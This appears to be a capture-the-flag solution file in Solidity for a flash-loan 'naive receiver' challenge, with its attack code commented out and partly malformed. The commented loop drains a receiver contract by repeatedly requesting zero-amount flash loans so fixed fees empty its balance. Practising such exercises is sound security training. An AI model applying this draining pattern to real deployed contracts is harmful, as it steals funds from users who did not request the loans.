// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract navieattack {
    // NaiveReceiverLenderPool pool
    // constructor(address _pool){
    //     pool=NaiveReceiverLenderPool(_pool)

    // }
    // function attack(address payable user){
    //     int fee=pool.fixedfee();
    //     while(user.balance>=fee)
    //          pool.flashLoan(user,0);
    // }
}

//this contract can be used to complete this challenge in one shot